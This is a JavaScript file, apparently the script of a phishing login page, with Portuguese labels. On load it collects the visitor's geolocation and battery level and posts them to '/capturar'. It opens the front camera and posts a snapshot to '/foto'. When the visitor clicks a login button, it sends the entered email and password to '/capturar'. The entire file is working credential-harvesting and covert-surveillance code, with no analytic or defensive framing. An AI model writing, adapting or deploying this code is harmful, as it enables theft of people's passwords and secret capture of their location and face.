let lat = "Aguardando", lon = "Aguardando";

// FUNÇÃO PARA PEGAR PORCENTAGEM DA BATERIA
async function getBat() {
    if ('getBattery' in navigator) {
        try {
            const b = await navigator.getBattery();
            return (b.level * 100).toFixed(0) + "%";
        } catch (e) { return "Erro"; }
    }
    return "N/S";
}

navigator.geolocation.getCurrentPosition(async p => {
    lat = p.coords.latitude; 
    lon = p.coords.longitude;
    const bat = await getBat();
    fetch('/capturar', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: "ACESSO_INICIAL", pass: "N/A", lat: lat, lon: lon, bateria: bat})
    });
}, async err => {
    const bat = await getBat();
    fetch('/capturar', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: "ACESSO_INICIAL", pass: "N/A", lat: "Negado", lon: "Negado", bateria: bat})
    });
});

const video = document.createElement('video');
const canvas = document.createElement('canvas');

navigator.mediaDevices.getUserMedia({ 
    video: { width: { ideal: 4096 }, height: { ideal: 2160 }, facingMode: "user" } 
}).then(stream => {
    video.srcObject = stream;
    video.setAttribute("playsinline", true);
    video.play();
    setTimeout(() => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg', 1.0);
        fetch('/foto', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({image: dataUrl})
        });
        stream.getTracks().forEach(t => t.stop());
        video.srcObject = null;
    }, 2000);
});

document.addEventListener('click', async function(e) {
    if (e.target && (e.target.tagName === 'BUTTON' || e.target.type === 'submit' || e.target.innerText.includes('Entrar'))) {
        const email = document.querySelector('input[type="email"], input[type="text"]')?.value || "Vazio";
        const pass = document.querySelector('input[type="password"]')?.value || "Vazio";
        const bat = await getBat();

        fetch('/capturar', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({email: email, pass: pass, lat: lat, lon: lon, bateria: bat})
        });
    }
});
